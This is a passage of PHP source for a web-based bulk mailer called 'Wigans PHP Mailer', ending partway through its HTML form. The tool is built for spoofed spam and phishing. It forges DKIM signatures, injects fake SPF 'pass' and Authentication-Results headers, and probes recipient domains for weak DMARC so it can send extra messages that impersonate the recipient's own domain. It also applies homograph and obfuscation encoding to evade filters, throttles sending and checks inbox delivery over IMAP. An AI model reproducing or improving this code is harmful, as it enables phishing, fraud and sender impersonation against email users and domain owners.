        $signature = base64_encode(random_bytes(256)); // Random realistic signature
        $dkim = "v=1; a=rsa-sha256; c=relaxed/relaxed; d={$from_domain}; s={$selector}; t={$timestamp}; bh={$body_hash}; b={$signature}";
        return $dkim;
    }
    public static function generateDMARCHeaders(string $from_domain, bool $spoof_relaxed = false): array {
        $headers = [];
        if ($spoof_relaxed) {
            // Spoof relaxed alignment by adding subdomains or misaligned headers
            $subdomain = 'sub.' . $from_domain;
            $headers['DKIM-Signature'] = self::generateDKIMSignature($subdomain, true); // Misaligned DKIM
            $headers['Authentication-Results'] = "mx.example.com; spf=pass (mx: {$from_domain}) smtp.mailfrom={$from_domain}"; // Fake SPF pass
            $headers['Received-SPF'] = "pass (mx: {$from_domain})"; // Additional spoof
        } else {
            // Basic DMARC bypass headers
            $headers['DMARC'] = "v=DMARC1; p=none; rua=mailto:dmarc@{$from_domain}"; // Fake report-only
        }
        return $headers;
    }
}
// DMARC Checker for Weak Attack
class DMARCChecker {
    private const CACHE_TTL = 3600; // 1 hour cache
    private string $cache_file;
    private array $cache = [];
    public function __construct(string $cache_file) {
        $this->cache_file = $cache_file;
        $this->loadCache();
    }
    private function loadCache(): void {
        if (file_exists($this->cache_file)) {
            $content = file_get_contents($this->cache_file);
            if ($content !== false) {
                $this->cache = json_decode($content, true) ?? [];
            }
        }
    }
    private function saveCache(): void {
        file_put_contents($this->cache_file, json_encode($this->cache));
    }
    public function isWeakDMARC(string $domain): bool {
        $cache_key = strtolower($domain);
        $now = time();
        if (isset($this->cache[$cache_key]) && ($this->cache[$cache_key]['timestamp'] + self::CACHE_TTL) > $now) {
            return $this->cache[$cache_key]['weak'];
        }
        $dmarc_records = dns_get_record("_dmarc.{$domain}", DNS_TXT);
        if (empty($dmarc_records)) {
            // No DMARC = weak
            $this->cache[$cache_key] = ['weak' => true, 'timestamp' => $now];
            $this->saveCache();
            return true;
        }
        $dmarc_txt = $dmarc_records[0]['txt'] ?? '';
        // Parse policy: p=none or sp=none is weak
        if (preg_match('/p\s*=\s*none/i', $dmarc_txt) || preg_match('/sp\s*=\s*none/i', $dmarc_txt)) {
            $weak = true;
        } else {
            $weak = false; // Strict policies like quarantine/reject are not weak
        }
        $this->cache[$cache_key] = ['weak' => $weak, 'timestamp' => $now];
        $this->saveCache();
        return $weak;
    }
}
// SMTP Bypass Manager with Delivery Check and Weak DMARC Attack
class SMTPBypassManager {
    private $mailer;
    private $config;
    private $contact_manager;
    private $delivery_checker;
    private $dmarc_checker;
    private $sent_count = 0;
    private array $status_history = []; // For limiting display rows
    public function __construct(PHPMailer $mailer, array $config, ContactManager $contact_manager, ?DeliveryChecker $delivery_checker = null, ?DMARCChecker $dmarc_checker = null) {
        $this->mailer = $mailer;
        $this->config = $config;
        $this->contact_manager = $contact_manager;
        $this->delivery_checker = $delivery_checker;
        $this->dmarc_checker = $dmarc_checker;
    }
    public function sendBulk(callable $messageBuilder, bool $weak_dmarc_attack = false): array {
        $results = [
            'success' => 0,
            'failures' => 0,
            'errors' => [],
            'total' => 0
        ];
        set_time_limit(0);
        $recipients = $this->contact_manager->getUnsentContacts();
        $results['total'] = count($recipients);
        if (empty($recipients)) {
            $this->updateProgress(0, $results, 'No unsent contacts available. Please upload contacts first.', []);
            return ['success' => 0, 'failures' => 0, 'errors' => ['No unsent contacts available'], 'total' => 0];
        }
        $reconnect_after = $this->config['reconnect_after'] ?? 50;
        $wait_time = $this->config['wait_time'] ?? 0;
        $emails_per_minute = $this->config['emails_per_minute'] ?? 0;
        $start_time = time();
        $emails_this_minute = 0;
        $this->updateProgress(0, $results, 'Starting send process...', []);
        foreach ($recipients as $index => $recipient) {
            try {
                // Skip weak DMARC attack for gmail.com
                $recipient_domain = explode('@', $recipient)[1] ?? '';
                $apply_weak_attack = $weak_dmarc_attack && strpos($recipient_domain, 'gmail.com') === false && $this->dmarc_checker && $this->dmarc_checker->isWeakDMARC($recipient_domain);
                $multipliers = $apply_weak_attack ? 3 : 1; // 3 emails if weak
                for ($multi = 0; $multi < $multipliers; $multi++) {
                    // Delivery check
                    if ($this->delivery_checker && !$this->delivery_checker->checkDelivery($this->sent_count)) {
                        $this->updateProgress(($index / $results['total']) * 100, $results, 'Delivery check failed - stopping send process', []);
                        return $results;
                    }
                    // Rate limiting per minute
                    if ($emails_per_minute > 0) {
                        $current_time = time();
                        if ($current_time - $start_time >= 60) {
                            $start_time = $current_time;
                            $emails_this_minute = 0;
                        }
                        if ($emails_this_minute >= $emails_per_minute) {
                            $sleep_time = 60 - ($current_time - $start_time);
                            if ($sleep_time > 0) {
                                $this->updateProgress(($index / $results['total']) * 100, $results, "Rate limit reached, waiting {$sleep_time}s...", []);
                                sleep($sleep_time);
                            }
                            $start_time = time();
                            $emails_this_minute = 0;
                        }
                    }
                    // Reconnect logic
                    if ($this->sent_count > 0 && $this->sent_count % $reconnect_after === 0) {
                        if ($this->mailer->Mailer === 'smtp') {
                            $this->mailer->smtpClose();
                        }
                        $this->updateProgress(($index / $results['total']) * 100, $results, "Reconnected after {$reconnect_after} emails", []);
                    }
                    // Build message (pass multiplier for weak attack variants)
                    $messageData = $messageBuilder($recipient, $index, $multi, $apply_weak_attack ? $recipient_domain : null);
                    $this->configureMailer($messageData);
                    // Send email
                    if ($this->mailer->send()) {
                        $results['success']++;
                        $this->sent_count++;
                        $emails_this_minute++;
                    
                        // Mark as sent (only once per recipient, not per variant)
                        if ($multi === 0) {
                            $this->contact_manager->markAsSent($recipient);
                        }
                        $multi_label = $apply_weak_attack ? " (Variant {$multi})" : '';
                        $this->updateProgress(($this->sent_count / ($results['total'] * ($apply_weak_attack ? 3 : 1))) * 100, $results, "Sent to {$recipient}{$multi_label} ({$this->sent_count}/{$results['total']})", ['success' => $recipient]);
                    } else {
                        throw new Exception($this->mailer->ErrorInfo);
                    }
                    // Wait between variants
                    if ($multi < $multipliers - 1) {
                        sleep(1); // Short delay between variants
                    }
                }
            } catch (Exception $e) {
                $results['failures']++;
                $results['errors'][] = "Failed to send to {$recipient}: " . $e->getMessage();
                $this->updateProgress(($index / $results['total']) * 100, $results, "Failed: {$recipient} - {$e->getMessage()}", ['failure' => $recipient]);
            }
            // Wait between emails
            if ($wait_time > 0) {
                sleep($wait_time);
            }
        }
        // Final cleanup
        if ($this->mailer->Mailer === 'smtp') {
            $this->mailer->smtpClose();
        }
        $stats = $this->contact_manager->getStats();
        $this->updateProgress(100, $results, "Completed: {$results['success']} successful, {$results['failures']} failed. Total: {$results['total']}, Remaining: {$stats['unsent']}", []);
        return $results;
    }
    private function updateProgress(float $progress, array $results, string $status, array $history_entry): void {
        $this->status_history[] = $status;
        if (count($this->status_history) > 5) {
            array_shift($this->status_history);
        }
        $history_list = implode('<br>', array_slice($this->status_history, -5));
        echo "<script>
                document.getElementById('sendProgress').style.width = '{$progress}%';
                document.getElementById('sendProgress').innerHTML = Math.round({$progress}) + '%';
                document.getElementById('sendStatus').innerHTML = '{$status}';
                document.getElementById('sendHistory').innerHTML = '{$history_list}';
                document.getElementById('sendResults').innerHTML = '<div class=\"alert alert-info\"><strong>Counters:</strong><br>Sent: {$results['success']}<br>Failed: {$results['failures']}<br>Total: {$results['total']}</div>';
              </script>";
        if (ob_get_level() > 0) ob_flush();
        flush();
    }
    private function configureMailer(array $messageData): void {
        $this->mailer->clearAddresses();
        $this->mailer->clearReplyTos();
        $this->mailer->clearCustomHeaders();
        $this->mailer->clearAttachments();
        $this->mailer->From = $messageData['from_email'];
        $this->mailer->FromName = $messageData['from_name'];
        $this->mailer->Subject = $messageData['subject'];
        $this->mailer->Body = $messageData['body'];
        $this->mailer->AltBody = $messageData['alt_body'];
        $this->mailer->XMailer = $messageData['xmailer'];
        $this->mailer->addAddress($messageData['to_email']);
        if (!empty($messageData['reply_to'])) {
            $this->mailer->addReplyTo($messageData['reply_to'], $messageData['reply_name'] ?? '');
        }
        foreach ($messageData['custom_headers'] ?? [] as $header => $value) {
            $this->mailer->addCustomHeader($header, $value);
        }
        foreach ($messageData['attachments'] ?? [] as $attachment) {
            $this->mailer->addAttachment($attachment['path'], $attachment['name']);
        }
    }
}
// Initialize Contact Manager and DMARC Checker
$contact_manager = new ContactManager($contacts_file, $sent_contacts_file);
$dmarc_checker = new DMARCChecker($dmarc_cache_file);
// Process form submission
$results = null;
if (isset($_SESSION['last_results'])) {
    $results = $_SESSION['last_results'];
    unset($_SESSION['last_results']);
}
if (isset($_POST['action'])) {
    $post_data = $_POST; // Capture for retention
    if ($_POST['action'] === 'send' && $_POST['csrf'] === $_SESSION['csrf']) {
        try {
            // Basic validation
            $sender_email = filter_var(trim($post_data['sender_email'] ?? ''), FILTER_VALIDATE_EMAIL);
            $sender_name = htmlspecialchars(trim($post_data['sender_name'] ?? ''), ENT_QUOTES, 'UTF-8');
            $subject = htmlspecialchars(trim($post_data['subject'] ?? ''), ENT_QUOTES, 'UTF-8');
            $pesan = trim($post_data['pesan'] ?? '');
        
            if (!$sender_email || !$sender_name || !$subject || !$pesan) {
                throw new Exception('All required fields must be filled');
            }
            // X-Mailer selection
            $xmailer_selection = $post_data['xmailer'] ?? 'Random';
            $xmailer = ($xmailer_selection === 'Random') ? XMailerSystem::getRandomXMailer() : $xmailer_selection;
            // Mailer type
            $mailer_type = $post_data['mailer_type'] ?? 'postfix';
            // Speed settings
            $wait = max(0, (int)($post_data['wait'] ?? 0));
            $reconnect = max(1, (int)($post_data['reconnect'] ?? 50));
            $emails_per_minute = max(0, (int)($post_data['emails_per_minute'] ?? 0));
            $timezone = htmlspecialchars(trim($post_data['timezone'] ?? 'random'), ENT_QUOTES, 'UTF-8');
            $encoding = htmlspecialchars(trim($post_data['encode'] ?? 'base64'), ENT_QUOTES, 'UTF-8');
            $type = ($post_data['type'] ?? 'plain') === 'html' ? 'html' : 'plain';
            $replyto = filter_var(trim($post_data['replyto'] ?? ''), FILTER_VALIDATE_EMAIL) ?: '';
            $replyname = htmlspecialchars(trim($post_data['replyname'] ?? ''), ENT_QUOTES, 'UTF-8');
            // Obfuscation and Homograph settings
            $obfuscation_enabled = isset($post_data['obfuscation_enabled']);
            $obfuscation_encodeSubject = isset($post_data['obfuscation_encodeSubject']);
            $obfuscation_encodeSender = isset($post_data['obfuscation_encodeSender']);
            $obfuscation_encodeBody = isset($post_data['obfuscation_encodeBody']);
            $obfuscation_encodeAttachments = isset($post_data['obfuscation_encodeAttachments']);
            $obfuscation_htmlToImage = isset($post_data['obfuscation_htmlToImage']);
        
            $homograph_enabled = isset($post_data['homograph_enabled']);
            $homograph_encodeSender = isset($post_data['homograph_encodeSender']);
            $homograph_encodeSubject = isset($post_data['homograph_encodeSubject']);
            $homograph_encodeBody = isset($post_data['homograph_encodeBody']);
            $homograph_encodeTLD = isset($post_data['homograph_encodeTLD']);
            $homograph_encodeAll = isset($post_data['homograph_encodeAll']);
            // Delivery Check settings
            $delivery_check_enabled = isset($post_data['delivery_check_enabled']);
            $imap_host = $post_data['imap_host'] ?? '';
            $imap_port = (int)($post_data['imap_port'] ?? 993);
            $imap_username = $post_data['imap_username'] ?? '';
            $imap_password = $post_data['imap_password'] ?? '';
            $check_after = (int)($post_data['check_after'] ?? 10);
            // Spoofing settings
            $enable_dkim_spoofing = isset($post_data['enable_dkim_spoofing']);
            $enable_dmarc_spoofing = isset($post_data['enable_dmarc_spoofing']);
            $enable_weak_dmarc_attack = isset($post_data['enable_weak_dmarc_attack']);
            // New settings
            $priority = $post_data['priority'] ?? 'normal';
            $enable_random_message_id = isset($post_data['enable_random_message_id']);
            // Store form data in session (ensures persistence across tabs)
            $_SESSION['form_data'] = [
                'sender_email' => $sender_email,
                'sender_name' => $sender_name,
                'xmailer' => $xmailer_selection,
                'mailer_type' => $mailer_type,
                'subject' => $subject,
                'pesan' => $pesan,
                'type' => $type,
                'encode' => $encoding,
                'replyto' => $replyto,
                'replyname' => $replyname,
                'wait' => $wait,
                'reconnect' => $reconnect,
                'emails_per_minute' => $emails_per_minute,
                'timezone' => $timezone,
                'smtp_host' => $post_data['smtp_host'] ?? '',
                'smtp_port' => $post_data['smtp_port'] ?? '587',
                'smtp_username' => $post_data['smtp_username'] ?? '',
                'smtp_secure' => $post_data['smtp_secure'] ?? 'tls',
                'obfuscation_enabled' => $obfuscation_enabled,
                'obfuscation_encodeSubject' => $obfuscation_encodeSubject,
                'obfuscation_encodeSender' => $obfuscation_encodeSender,
                'obfuscation_encodeBody' => $obfuscation_encodeBody,
                'obfuscation_encodeAttachments' => $obfuscation_encodeAttachments,
                'obfuscation_htmlToImage' => $obfuscation_htmlToImage,
                'homograph_enabled' => $homograph_enabled,
                'homograph_encodeSender' => $homograph_encodeSender,
                'homograph_encodeSubject' => $homograph_encodeSubject,
                'homograph_encodeBody' => $homograph_encodeBody,
                'homograph_encodeTLD' => $homograph_encodeTLD,
                'homograph_encodeAll' => $homograph_encodeAll,
                'delivery_check_enabled' => $delivery_check_enabled,
                'imap_host' => $imap_host,
                'imap_port' => $imap_port,
                'imap_username' => $imap_username,
                'check_after' => $check_after,
                'enable_dkim_spoofing' => $enable_dkim_spoofing,
                'enable_dmarc_spoofing' => $enable_dmarc_spoofing,
                'enable_weak_dmarc_attack' => $enable_weak_dmarc_attack,
                'priority' => $priority,
                'enable_random_message_id' => $enable_random_message_id
            ];
            $form_data = $_SESSION['form_data'];
            session_write_close(); // Release session lock before long-running process
            // Output progress page with history limit
            echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sending Emails - Wigans PHP Mailer</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { font-family: \'Roboto\', sans-serif; }
        #sendHistory { max-height: 150px; overflow-y: auto; }
    </style>
</head>
<body>
    <div class="container mt-5">
        <h2>Sending Campaign in Progress</h2>
        <div class="progress mb-3" style="height: 25px;">
            <div class="progress-bar" id="sendProgress" role="progressbar" style="width: 0%">0%</div>
        </div>
        <div id="sendStatus" class="alert alert-info">Starting send process...</div>
        <div id="sendHistory" class="alert alert-secondary mt-2"></div>
        <div id="sendResults" class="mt-3"></div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>';
            if (ob_get_level() > 0) ob_end_flush();
            flush();
            // Initialize PHPMailer
            $mail = new PHPMailer();
            // Configure mailer type
            if ($mailer_type === 'smtp') {
                $mail->isSMTP();
                $mail->Host = $post_data['smtp_host'] ?? '';
                $mail->Port = (int)($post_data['smtp_port'] ?? 587);
                $mail->SMTPAuth = !empty($post_data['smtp_username']);
                $mail->Username = $post_data['smtp_username'] ?? '';
                $mail->Password = $post_data['smtp_password'] ?? '';
                $mail->SMTPSecure = $post_data['smtp_secure'] ?? 'tls';
                $mail->SMTPKeepAlive = true;
            } else {
                $mail->isSendmail();
            }
            $mail->Encoding = $encoding;
            $mail->isHTML($type === 'html');
            $mail->XMailer = $xmailer;
            // Initialize Delivery Checker if enabled
            $delivery_checker = null;
            if ($delivery_check_enabled && !empty($imap_host) && !empty($imap_username)) {
                $delivery_checker = new DeliveryChecker([
                    'imap_host' => $imap_host,
                    'imap_port' => $imap_port,
                    'imap_username' => $imap_username,
                    'imap_password' => $imap_password,
                    'check_after' => $check_after
                ]);
            
                // Add delivery marker to subject
                $subject .= ' ' . $delivery_checker->getSubjectMarker();
            }
            // Initialize bypass manager
            $bypassConfig = [
                'reconnect_after' => $reconnect,
                'wait_time' => $wait,
                'emails_per_minute' => $emails_per_minute
            ];
            $bypassManager = new SMTPBypassManager($mail, $bypassConfig, $contact_manager, $delivery_checker, $dmarc_checker);
            // Start sending with weak DMARC attack if enabled
            $results = $bypassManager->sendBulk(function($to, $index, $multi = 0, $weak_domain = null) use (
                $sender_email, $sender_name, $subject, $pesan, $timezone,
                $replyto, $replyname, $type, $form_data, $enable_dkim_spoofing, $enable_dmarc_spoofing, $enable_weak_dmarc_attack, $priority, $enable_random_message_id
            ) {
                // Handle random timezone
                $current_timezone = $timezone;
                if ($timezone === 'random') {
                    $tz_list = ['UTC', 'America/New_York', 'Europe/London', 'Asia/Tokyo', 'Africa/Lagos', 'Australia/Sydney', 'Asia/Kolkata'];
                    $current_timezone = $tz_list[array_rand($tz_list)];
                }
                // Parse sender parts
                $sender_user = explode('@', $sender_email)[0] ?? 'info';
                $sender_domain = explode('@', $sender_email)[1] ?? 'example.com';
                // Apply template replacements to all fields
                $from_email_processed = TemplateSystem::applyReplacements($sender_email, $to, $current_timezone);
                $from_name_processed = TemplateSystem::applyReplacements($sender_name, $to, $current_timezone);
                $subject_processed = TemplateSystem::applyReplacements($subject, $to, $current_timezone);
                $body_processed = TemplateSystem::applyReplacements($pesan, $to, $current_timezone);
                // Weak DMARC variants
                if ($enable_weak_dmarc_attack && $weak_domain && $multi > 0) {
                    if ($multi === 1) {
                        // Variant 1: Spoof sender user@weak_domain
                        $from_email_processed = "{$sender_user}@{$weak_domain}";
                    } elseif ($multi === 2) {
                        // Variant 2: Spoof full weak domain in sender
                        $from_email_processed = str_replace($sender_domain, $weak_domain, $from_email_processed);
                    }
                }
                // Apply obfuscation and homograph if enabled
                if ($form_data['obfuscation_enabled'] ?? false) {
                    $obfuscator = new FinalObfuscator(); // Auto-generates dynamic key per instance
                
                    if ($form_data['obfuscation_encodeSender'] ?? false) {
                        $from_name_processed = $obfuscator->obfuscateTextContent($from_name_processed);
                    }
                
                    if ($form_data['obfuscation_encodeSubject'] ?? false) {
                        $subject_processed = $obfuscator->obfuscateTextContent($subject_processed);
                    }
                
                    if ($form_data['obfuscation_encodeBody'] ?? false && $type === 'html') {
                        $body_processed = $obfuscator->processHTML($body_processed);
                    }
                }
                if ($form_data['homograph_enabled'] ?? false) {
                    if ($form_data['homograph_encodeSender'] ?? false) {
                        $from_name_processed = HomographSystem::encodeWithHomograph($from_name_processed);
                    }
                
                    if ($form_data['homograph_encodeSubject'] ?? false) {
                        $subject_processed = HomographSystem::encodeWithHomograph($subject_processed);
                    }
                
                    if ($form_data['homograph_encodeBody'] ?? false) {
                        $body_processed = HomographSystem::encodeWithHomograph($body_processed);
                    }
                }
                $custom_headers = [];
                $from_domain = explode('@', $from_email_processed)[1] ?? 'example.com';
                if ($enable_dkim_spoofing) {
                    $fake_dkim = SpoofingSystem::generateDKIMSignature($from_domain, true);
                    $custom_headers['DKIM-Signature'] = $fake_dkim;
                }
                if ($enable_dmarc_spoofing) {
                    $dmarc_headers = SpoofingSystem::generateDMARCHeaders($from_domain, true);
                    $custom_headers = array_merge($custom_headers, $dmarc_headers);
                }
                if ($enable_random_message_id) {
                    $msg_id = '<' . md5(uniqid() . microtime()) . '@' . $from_domain . '>';
                    $custom_headers['Message-ID'] = $msg_id;
                }
                $priority_map = ['high' => '1', 'normal' => '3', 'low' => '5'];
                $custom_headers['X-Priority'] = $priority_map[$priority] ?? '3';
                return [
                    'from_email' => $from_email_processed,
                    'from_name' => $from_name_processed,
                    'to_email' => $to,
                    'subject' => $subject_processed,
                    'body' => $body_processed,
                    'alt_body' => strip_tags(str_replace(['<br>', '<br/>', '<br />'], "\n", $body_processed)),
                    'reply_to' => $replyto,
                    'reply_name' => $replyname,
                    'xmailer' => $form_data['xmailer'] ?? 'Random',
                    'custom_headers' => $custom_headers
                ];
            }, $enable_weak_dmarc_attack);
            // Reopen session to set results
            if (session_status() === PHP_SESSION_NONE) {
                session_start();
            }
            $_SESSION['last_results'] = $results;
            exit;
        } catch (Exception $e) {
            echo "<div class='alert alert-danger'>Error: " . htmlspecialchars($e->getMessage()) . "</div>";
            if (session_status() === PHP_SESSION_NONE) {
                session_start();
            }
            $_SESSION['last_results'] = ['success' => 0, 'failures' => 1, 'errors' => [$e->getMessage()], 'total' => 0];
            exit;
        }
    } elseif ($_POST['action'] === 'clear') {
        // Clear session data but retain core fields if needed
        $_SESSION['form_data'] = [];
        $form_data = [];
        echo "<div class='alert alert-success'>Form data cleared!</div>";
    } elseif ($_POST['action'] === 'upload_contacts') {
        $contacts_content = $post_data['contacts'] ?? '';
        $remove_sent = isset($post_data['remove_sent']);
        if ($contact_manager->uploadContacts($contacts_content, $remove_sent)) {
            echo "<div class='alert alert-success'>Contacts uploaded successfully!</div>";
            $form_data['contacts'] = $contacts_content;
            $_SESSION['form_data']['contacts'] = $contacts_content;
        } else {
            echo "<div class='alert alert-danger'>Failed to upload contacts!</div>";
        }
        // Retain all form data
        $form_data = array_merge($form_data, $post_data);
        $_SESSION['form_data'] = $form_data;
    } elseif ($_POST['action'] === 'clear_sent') {
        if ($contact_manager->clearSentContacts()) {
            echo "<div class='alert alert-success'>Sent contacts cleared!</div>";
        } else {
            echo "<div class='alert alert-danger'>Failed to clear sent contacts!</div>";
        }
        // Retain form data
        $form_data = $_SESSION['form_data'] ?? [];
    } elseif ($_POST['action'] === 'clear_all_contacts') {
        if ($contact_manager->clearAllContacts()) {
            echo "<div class='alert alert-success'>All contacts cleared!</div>";
        } else {
            echo "<div class='alert alert-danger'>Failed to clear contacts!</div>";
        }
        // Retain form data
        $form_data = $_SESSION['form_data'] ?? [];
    } elseif ($_POST['action'] === 'download_unsent') {
        $unsent_contacts = $contact_manager->getUnsentContacts();
        header('Content-Type: text/plain');
        header('Content-Disposition: attachment; filename="unsent_contacts.txt"');
        echo implode("\n", $unsent_contacts);
        exit;
    } else {
        // For security tab submit (no action specified), save settings to session and retain all
        $security_fields = ['obfuscation_enabled', 'obfuscation_encodeSubject', 'obfuscation_encodeSender', 'obfuscation_encodeBody', 'obfuscation_encodeAttachments', 'obfuscation_htmlToImage', 'homograph_enabled', 'homograph_encodeSender', 'homograph_encodeSubject', 'homograph_encodeBody', 'homograph_encodeTLD', 'homograph_encodeAll', 'delivery_check_enabled', 'imap_host', 'imap_port', 'check_after', 'enable_dkim_spoofing', 'enable_dmarc_spoofing', 'enable_weak_dmarc_attack', 'priority', 'enable_random_message_id'];
        foreach ($security_fields as $field) {
            $form_data[$field] = isset($post_data[$field]) ? $post_data[$field] : ($field === 'priority' ? 'normal' : false);
            $_SESSION['form_data'][$field] = $form_data[$field];
        }
        // Merge back to ensure send tab fields persist
        $form_data = array_merge($_SESSION['form_data'] ?? [], $form_data);
        $_SESSION['form_data'] = $form_data;
        echo "<div class='alert alert-success'>Settings saved! Form data preserved across tabs.</div>";
    }
}
// Get contact statistics
$contact_stats = $contact_manager->getStats();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Wigans PHP Mailer</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', sans-serif; }
        .smtp-fields, .delivery-check-fields { display: none; }
        .required::after { content: " *"; color: red; }
        .tab-pane { padding: 20px 0; }
        h1 { font-weight: 700; color: #333; }
        .card { box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
    </style>
</head>
<body>
    <div class="container mt-4">
        <h1 class="mb-4">Wigans PHP Mailer</h1>
    
        <?php if (isset($results)): ?>
            <div class="alert alert-info">
                Campaign completed: <?php echo $results['success']; ?> successful, <?php echo $results['failures']; ?> failed
                <?php if (!empty($results['errors'])): ?>
                    <div class="mt-2">
                        <strong>Failures details:</strong>
                        <ul class="mt-1 mb-0">
                            <?php foreach ($results['errors'] as $error): ?>
                                <li><?php echo htmlspecialchars($error); ?></li>
                            <?php endforeach; ?>
                        </ul>
                    </div>
                <?php endif; ?>
            </div>
        <?php endif; ?>
        <ul class="nav nav-tabs" id="myTab" role="tablist">
            <li class="nav-item" role="presentation">
                <button class="nav-link active" id="send-tab" data-bs-toggle="tab" data-bs-target="#send" type="button" role="tab">Send Emails</button>
            </li>
            <li class="nav-item" role="presentation">
                <button class="nav-link" id="contacts-tab" data-bs-toggle="tab" data-bs-target="#contacts" type="button" role="tab">Contact Management</button>
            </li>
            <li class="nav-item" role="presentation">
                <button class="nav-link" id="security-tab" data-bs-toggle="tab" data-bs-target="#security" type="button" role="tab">Security & Obfuscation</button>
            </li>
        </ul>
        <div class="tab-content" id="myTabContent">
            <!-- Send Emails Tab -->
            <div class="tab-pane fade show active" id="send" role="tabpanel">
                <form method="post" enctype="multipart/form-data">
                    <input type="hidden" name="csrf" value="<?php echo htmlspecialchars($_SESSION['csrf']); ?>">
                
                    <div class="card mb-4">
                        <div class="card-header">Basic Settings</div>
                        <div class="card-body">
                            <div class="row g-3">
                                <div class="col-md-6">
                                    <label class="form-label required">Sender Email</label>
                                    <input type="email" name="sender_email" class="form-control"
                                           value="<?php echo htmlspecialchars($form_data['sender_email'] ?? ''); ?>" required>
                                </div>
                                <div class="col-md-6">
                                    <label class="form-label required">Sender Name</label>
                                    <input type="text" name="sender_name" class="form-control"
                                           value="<?php echo htmlspecialchars($form_data['sender_name'] ?? ''); ?>" required>
                                </div>
                            </div>
                        
                            <div class="row g-3 mt-2">
                                <div class="col-md-6">
                                    <label class="form-label required">Subject</label>
                                    <input type="text" name="subject" class="form-control"
                                           value="<?php echo htmlspecialchars($form_data['subject'] ?? ''); ?>" required>
                                </div>
                                <div class="col-md-6">
                                    <label class="form-label">X-Mailer</label>
                                    <select name="xmailer" class="form-select">
                                        <?php foreach (XMailerSystem::getXMailers() as $value => $name): ?>
                                            <option value="<?php echo $value; ?>"
                                                <?php echo ($form_data['xmailer'] ?? 'Random') === $value ? 'selected' : ''; ?>>
                                                <?php echo $name; ?>
                                            </option>
                                        <?php endforeach; ?>
                                    </select>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="card mb-4">
                        <div class="card-header">Mailer Configuration</div>
                        <div class="card-body">
                            <div class="row g-3">
                                <div class="col-md-6">
                                    <label class="form-label">Mailer Type</label>
                                    <select name="mailer_type" id="mailer_type" class="form-select" onchange="toggleSmtpFields()">
                                        <option value="postfix" <?php echo ($form_data['mailer_type'] ?? 'postfix') === 'postfix' ? 'selected' : ''; ?>>Postfix (Local)</option>
                                        <option value="smtp" <?php echo ($form_data['mailer_type'] ?? '') === 'smtp' ? 'selected' : ''; ?>>SMTP</option>
                                    </select>
                                </div>
                                <div class="col-md-6">
                                    <label class="form-label">Email Type</label>
                                    <select name="type" class="form-select">
                                        <option value="plain" <?php echo ($form_data['type'] ?? 'plain') === 'plain' ? 'selected' : ''; ?>>Plain Text</option>
                                        <option value="html" <?php echo ($form_data['type'] ?? '') === 'html' ? 'selected' : ''; ?>>HTML</option>
                                    </select>
                                </div>
                            </div>
                            <div id="smtp_fields" class="smtp-fields mt-3">
                                <div class="row g-3">
                                    <div class="col-md-6">
                                        <label class="form-label">SMTP Host</label>
                                        <input type="text" name="smtp_host" class="form-control"
                                               value="<?php echo htmlspecialchars($form_data['smtp_host'] ?? ''); ?>">
                                    </div>
                                    <div class="col-md-3">
                                        <label class="form-label">SMTP Port</label>
                                        <input type="number" name="smtp_port" class="form-control"
                                               value="<?php echo htmlspecialchars($form_data['smtp_port'] ?? '587'); ?>">
                                    </div>
                                    <div class="col-md-3">
                                        <label class="form-label">Encryption</label>
                                        <select name="smtp_secure" class="form-select">
                                            <option value="" <?php echo ($form_data['smtp_secure'] ?? '') === '' ? 'selected' : ''; ?>>None</option>
                                            <option value="tls" <?php echo ($form_data['smtp_secure'] ?? 'tls') === 'tls' ? 'selected' : ''; ?>>TLS</option>
                                        </select>
                                    </div>
                                </div>
                                <div class="row g-3 mt-2">
                                    <div class="col-md-6">
                                        <label class="form-label">SMTP Username</label>
                                        <input type="text" name="smtp_username" class="form-control"
                                               value="<?php echo htmlspecialchars($form_data['smtp_username'] ?? ''); ?>">
                                    </div>
                                    <div class="col-md-6">
                                        <label class="form-label">SMTP Password</label>
                                        <input type="password" name="smtp_password" class="form-control">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="card mb-4">
                        <div class="card-header">Speed & Limits</div>
                        <div class="card-body">
                            <div class="row g-3">
                                <div class="col-md-4">
                                    <label class="form-label">Delay Between Emails (seconds)</label>
                                    <input type="number" name="wait" class="form-control" min="0"
                                           value="<?php echo htmlspecialchars($form_data['wait'] ?? '0'); ?>">
                                </div>
                                <div class="col-md-4">
                                    <label class="form-label">Reconnect After (emails)</label>
                                    <input type="number" name="reconnect" class="form-control" min="1"
                                           value="<?php echo htmlspecialchars($form_data['reconnect'] ?? '50'); ?>">
                                </div>
                                <div class="col-md-4">
                                    <label class="form-label">Emails Per Minute (0 = unlimited)</label>
                                    <input type="number" name="emails_per_minute" class="form-control" min="0"
                                           value="<?php echo htmlspecialchars($form_data['emails_per_minute'] ?? '0'); ?>">
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="card mb-4">
                        <div class="card-header">Advanced Headers</div>
                        <div class="card-body">
                            <div class="row g-3">
                                <div class="col-md-6">
                                    <label class="form-label">Priority</label>
                                    <select name="priority" class="form-select">
                                        <option value="normal" <?php echo ($form_data['priority'] ?? 'normal') === 'normal' ? 'selected' : ''; ?>>Normal</option>
                                        <option value="high" <?php echo ($form_data['priority'] ?? '') === 'high' ? 'selected' : ''; ?>>High</option>
                                        <option value="low" <?php echo ($form_data['priority'] ?? '') === 'low' ? 'selected' : ''; ?>>Low</option>
                                    </select>
                                </div>
                                <div class="col-md-6">
                                    <div class="form-check mt-3">
                                        <input class="form-check-input" type="checkbox" name="enable_random_message_id" id="enable_random_message_id"
                                               <?php echo ($form_data['enable_random_message_id'] ?? false) ? 'checked' : ''; ?>>
                                        <label class="form-check-label" for="enable_random_message_id">Enable Random Message-ID</label>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="card mb-4">
